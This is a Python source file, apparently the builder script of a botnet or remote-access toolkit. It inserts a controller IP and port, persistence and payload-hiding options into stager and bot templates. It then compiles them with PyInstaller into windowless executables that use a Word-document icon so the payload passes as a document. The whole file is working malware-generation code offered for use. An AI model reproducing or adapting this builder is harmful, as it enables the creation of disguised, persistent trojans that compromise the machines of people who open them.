# Date: 09/01/2018
# Author: Pure-L0G1C
# Description: Execute creator

import os
import sys
import zlib
import shlex
import shutil
import smtplib
import tempfile

import const

from lib.file import File
from lib.args import Args

try:
    from PyInstaller import __main__ as pyi, is_win
except:
    print('Please install Pyinstaller: pip install pyinstaller')
    sys.exit(1)


class Executor(object):

    def __init__(self, ip, port, filename, wait, icon, hide, persist):
        self.ip = ip
        self.port = port
        self.hide = hide
        self.wait = wait
        self.binary = b''
        self.persist = persist
        self.filename = filename
        self.icon = shlex.quote(icon)

        self.output_dir = 'output'
        self.tmp_dir = tempfile.mkdtemp()
        self.dist_path = os.path.join(self.tmp_dir, 'application')

        self.output_dir = 'output'
        self.dist_path = os.path.join(self.tmp_dir, 'application')

        # Stager
        self.stager_template = os.path.join('bot', 'template_stager.py')
        self.stager_py_temp = os.path.join('bot', filename + '.py')
        self.stager_compiled = os.path.join(self.dist_path, filename)

        # Payload
        self.bot_template = os.path.join('bot', 'template_payload.py')

        payload_name = os.path.splitext(
            os.path.basename(const.PAYLOAD_PATH + const.PAYLOAD_NAME))[0]
        
        self.in_windows = ".exe" in const.PAYLOAD_NAME

        self.bot_py_temp = os.path.join('bot', payload_name + '.py')
        self.bot_compiled = os.path.join(self.dist_path,  payload_name)

        # Suite of debugging prints
        print()
        print(f'[STAGER template:] {self.stager_template}')
        print(f'[STAGER_py_template] {self.bot_py_temp}')
        print(f'[BOT_compiled:] {self.bot_compiled}')
        print('-----------------------------------')
        print(f'[BOT template:] {self.bot_template}')
        print(f'[BOT_py_temp:] {self.bot_py_temp}')
        print(f'[BOT_compiled:] {self.bot_compiled}')
        print()

    def replace(self, data, _dict):
        for k in _dict:
            data = data.replace(k, _dict[k])
        return data

    def compile_file(self, path):

        print('\n--------------------------------------------------------')
        print(f"Inside builder.py compile_file() with path: {path}")
        path = os.path.abspath(path)

        build_path = os.path.join(self.tmp_dir, 'build')
        cmd = 'pyinstaller -y -F -w -i {} {}'.format(
            self.icon, shlex.quote(path))

        print(f"Inside builder.py compile_file() with command: {cmd}")

        sys.argv = shlex.split(cmd) + ['--distpath', self.dist_path] + \
            ['--workpath', build_path] + ['--specpath', self.tmp_dir]
        
        print(f"Inside builder.py compile_file() with sys.argv: {sys.argv}")
        print('--------------------------------------------------------\n')
        print()

        pyi.run()

    def write_template(self, template, py_temp, _dict):
        data = ''
        for _data in File.read(template, False):
            data += _data

        File.write(py_temp, self.replace(data, _dict))
        self.compile_file(py_temp)

    def compile_stager(self):
        args = {
            'addr_ip': repr(self.ip),
            'addr_port': str(self.port),
            'block_size': repr(const.BLOCK_SIZE),
            'stager_code': repr(const.STAGER_CODE),
            'output_file': repr(self.filename + '_.exe') if self.in_windows else repr(self.filename + '_'),
            'hide_payload': str(self.hide),
        }

        # handle windows vs unix systems
        print(f"\n File for stager downloading {args['output_file']}")

        self.write_template(self.stager_template, self.stager_py_temp, args)
        self.move_file(self.stager_compiled, self.output_dir)

    def compile_bot(self):
        args = {
            'addr_ip': repr(self.ip),
            'addr_port': str(self.port),
            'wait_time': str(self.wait),
            'auto_persist': repr(self.persist)
        }

        self.write_template(self.bot_template, self.bot_py_temp, args)

        payload_output = os.path.dirname(const.PAYLOAD_PATH)
        self.move_file(self.bot_compiled, payload_output)

    def move_file(self, file, output_dir):
        file = os.path.basename(file)
        _path = os.path.join(output_dir, file)

        if not os.path.exists(output_dir):
            os.mkdir(output_dir)

        if os.path.exists(_path):
            os.remove(_path)

        path = os.path.join(self.dist_path, file)
        shutil.move(path, output_dir)

    def start(self):
        self.compile_bot()
        self.compile_stager()
        self.clean_up()

    def clean_up(self):
        shutil.rmtree(self.tmp_dir)
        os.remove(self.bot_py_temp)
        os.remove(self.stager_py_temp)


if __name__ == '__main__':
    args = Args()
    if args.set_args():

        args.icon = os.path.abspath("icons/wordicon.ico")

        executor = Executor(args.ip, args.port, args.name,
                            args.wait, args.icon, args.hide, args.persist)

        executor.start()
        os.system('cls' if is_win else 'clear')
        print(f'Finished generating {executor.filename}')
        print('Look in the directory named \'output\' for your file')
